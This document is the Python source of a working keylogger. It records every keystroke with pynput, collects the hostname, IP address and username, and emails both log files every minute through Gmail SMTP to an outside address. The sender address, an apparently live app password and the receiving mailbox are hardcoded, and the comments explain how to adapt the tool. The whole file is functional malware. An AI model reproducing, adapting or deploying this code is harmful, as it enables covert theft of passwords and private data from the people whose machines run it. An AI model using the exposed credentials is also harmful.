#Main keylogger

#Import Modules
import pynput
from pynput import keyboard
import platform # Get system info (for sys_info)
import socket # Get network info (for sys_info)
import getpass # Get username (for sys_info)
from email.message import EmailMessage
import ssl
import smtplib
import threading, time # For sending email every 60 seconds (for periodic_email)


key_info = "key_log.txt" # text file for key presses
sys_info = "sys_info.txt" # text file for os info 

#These varibals are for the email section, tinker with them for your needs.
email_sender = "alexsandoval879@gmail.com" #email that will be sending the logs
email_pass = "gfxn rjsv kfgs ylnp" # app password from email sender gmail. (find in security settings)
email_receiver = "xamacir697@7novels.com" #email that will receieve the log
subject = "Keylogger Report" #Name of the email
body = """Attached are the keylogger logs and system information."""

# Function to send email with the logs attached
def send_email():
    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject
    em.set_content(body)

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, email_pass)
        with open(key_info, "r") as logKey:
            em.add_attachment(logKey.read(), filename=key_info)
        with open(sys_info, "r") as logSys:
            em.add_attachment(logSys.read(), filename=sys_info)
        smtp.send_message(em)


# Function send email every minute (change int for different times, ex: 120 for 2 minutes)
import threading, time
def periodic_email(interval_seconds: int = 60):
    while True:
        send_email()
        time.sleep(interval_seconds)


#Function to log key presses
def Keypress(key):
    print(str(key))
    with open(key_info, "a") as logKey:   #Open log file to append to
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            logKey.write(f"[{str(key).replace('Key.', '')}]") # This is for special keys like space, enter, etc. To make it look more neat, .replace will remove the Key. from the log file


#Function to log system information
def system_information():
    with open(sys_info, "w") as logSys: #recalling the file we made earlier so that it can start writing to it
        logSys.write(f"System: {platform.system()} {platform.release()}\n")
        logSys.write(f"Network Name: {platform.node()}\n")
        logSys.write(f"Machine: {platform.machine()}\n")
        logSys.write(f"Processor: {platform.processor()}\n")
        logSys.write(f"Hostname: {socket.gethostname()}\n")
        logSys.write(f"IP Address: {socket.gethostbyname(socket.gethostname())}\n")
        logSys.write(f"Username: {getpass.getuser()}\n") # everything from line 28 to 34 is for system information, look at the name to see what it will capture...


#Main function (Used to listen)        
if __name__ == "__main__":
    listner = keyboard.Listener(on_press=Keypress)
    listner.start()
    system_information()
    email_thread = threading.Thread(target=periodic_email, daemon=True)
    email_thread.start()
    input()

